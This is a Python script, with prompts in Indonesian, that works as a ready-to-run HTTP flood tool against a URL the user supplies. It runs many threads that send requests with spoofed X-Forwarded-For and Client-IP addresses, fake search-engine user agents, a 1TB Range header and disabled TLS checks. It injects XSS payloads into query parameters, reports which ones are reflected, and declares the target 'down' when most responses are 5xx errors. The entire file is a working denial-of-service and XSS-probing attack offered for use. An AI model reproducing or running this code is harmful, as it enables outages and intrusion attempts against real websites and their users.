import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import threading
import requests
import random
import string
import time
import sys

xss_payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "';alert(1);//",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror='alert(1)'></video>"
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

def random_string(length=6):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def status_text(code):
    return {
        200: "OK", 206: "Partial Content", 301: "Redirect", 403: "Forbidden",
        404: "Not Found", 429: "Rate Limited", 500: "Internal Error",
        502: "Bad Gateway", 503: "Unavailable", 504: "Timeout"
    }.get(code, "Unknown")

stop_flag = False
lock = threading.Lock()
total_requests = 0
error_5xx = 0

def flood(target, duration, superfast=False):
    global stop_flag, total_requests, error_5xx
    start = time.time()
    session = requests.Session()
    while not stop_flag:
        if time.time() - start > duration:
            stop_flag = True
            break
        try:
            payload = random.choice(xss_payloads)
            fake_ip = random_ip()
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Range": "bytes=0-1000000000000",
                "Referer": f"https://www.google.com/search?q={random_string()}",
                "Connection": "keep-alive",
                "X-Forwarded-For": fake_ip,
                "Client-IP": fake_ip,
                "X-XSS-Protection": "0",
                "X-Requested-With": "XMLHttpRequest",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "no-cache"
            }
            params = {
                "q": payload,
                random_string(): random_string()
            }
            timeout_val = 0.5 if superfast else 5
            r = session.get(target, headers=headers, params=params, timeout=timeout_val, verify=False)
            xss_result = "XSS=YES" if payload in r.text else "XSS=NO"

            with lock:
                total_requests += 1
                if r.status_code in [500, 502, 503, 504]:
                    error_5xx += 1

            print(f"[{r.status_code} {status_text(r.status_code)}] {xss_result} | IP={fake_ip} | Payload={payload}")
        except Exception as e:
            if not superfast:
                print(f"[!] Error: {str(e)}")

if __name__ == "__main__":
    try:
        target = input("Target URL (cth: https://example.com/search): ").strip()
        duration = int(input("Durasi serangan (detik): "))
        threads = int(input("Jumlah thread: "))
        fast = input("Aktifkan Super Fast Mode? (y/n): ").strip().lower() == "y"

        print(f"\n[=] Menyerang {target} selama {duration}s dengan {threads} thread... (Fast Mode: {fast})")
        print(f"[=] Header Range digunakan: bytes=0-1000000000000 (1TB)\n")

        for _ in range(threads):
            t = threading.Thread(target=flood, args=(target, duration, fast))
            t.daemon = True
            t.start()

        time.sleep(duration)
        stop_flag = True
        time.sleep(1)

        print("\n[+] Serangan selesai.")
        if total_requests > 0:
            rate = (error_5xx / total_requests) * 100
            print(f"[i] Total request: {total_requests}, Respon 5xx: {error_5xx} ({rate:.2f}%)")
            if rate >= 80:
                print("[!] Target kemungkinan DOWN (80%+ respon 5xx)\n")
        else:
            print("[!] Tidak ada request terkirim.\n")

    except KeyboardInterrupt:
        print("\n[!] Dihentikan manual.")
        sys.exit(0)